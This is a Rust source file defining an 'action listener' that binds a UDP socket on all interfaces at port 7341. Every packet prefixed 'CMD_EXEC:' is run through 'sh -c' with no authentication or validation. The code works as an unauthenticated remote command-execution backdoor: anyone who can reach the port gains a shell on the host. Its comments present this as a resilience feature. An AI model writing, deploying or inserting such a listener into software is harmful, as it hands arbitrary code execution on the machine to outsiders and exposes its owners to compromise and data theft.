use std::net::UdpSocket;
use std::process::Command;
use std::io;
use socket2::{Socket, Domain, Type, Protocol};

pub fn start_action_listener() -> io::Result<()> {
    // 🧬 V0.3.9 Resilience: SO_REUSEADDR allows instant port reclamation
    let socket = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
    
    // This allows the socket to bind even if the port is in TIME_WAIT
    socket.set_reuse_address(true)?;
    
    let address = "0.0.0.0:7341".parse::<std::net::SocketAddr>().unwrap();
    socket.bind(&address.into())?;
    
    let socket: UdpSocket = socket.into();
    println!("🛡️ Action Listener Active on Port 7341 (Resilience Mode)...");

    let mut buf = [0; 1024];
    loop {
        let (amt, _) = socket.recv_from(&mut buf)?;
        let msg = String::from_utf8_lossy(&buf[..amt]);

        if msg.starts_with("CMD_EXEC:") {
            let cmd = &msg[9..];
            println!("🚀 Executing Remote Directive: {}", cmd);
            
            let output = Command::new("sh")
                .arg("-c")
                .arg(cmd)
                .output()?;
            
            println!("✅ Output: {}", String::from_utf8_lossy(&output.stdout));
        }
    }
}
